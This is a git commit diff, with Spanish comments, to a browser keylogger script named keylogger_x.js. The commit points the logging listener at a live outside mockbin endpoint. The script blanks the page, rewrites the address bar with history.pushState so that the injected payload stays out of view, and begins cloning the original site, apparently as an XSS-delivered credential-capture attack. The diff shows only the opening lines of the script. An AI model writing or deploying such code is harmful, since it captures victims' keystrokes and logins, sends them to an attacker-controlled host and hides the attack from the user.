2c285c830c683e24d4c93f40ca7d17d9726f0501
CTPache <33907485+CTPache@users.noreply.github.com>
2024-03-27 11:49:30 +0100

    Arreglo a la URL, para esconder el payload y conservar el resto

--- keylogger_x.js
+++ keylogger_x.js
@@ -1,9 +1,8 @@
-//Esto lo dejo así para cambiarlo por consola
-var https_listener_for_logging = 'https://listener.changeme'
+var https_listener_for_logging = 'https://1f84a21f49834055849d5bce74489025.api.mockbin.io/'
 // Borramos el contenido para que parezca que sigue cargando
 document.body.innerHTML = '';
 // Esto cambia la URL que muestra el navegador, para que no se vea el payload
-var newUrl = window.location.href.split('?')[0];
+var newUrl = window.location.href.replace(/\lang.*\)/i,'lang=ES-ES');
 history.pushState({ path: newUrl }, '', newUrl);
 
 //Todo esto clona la web original
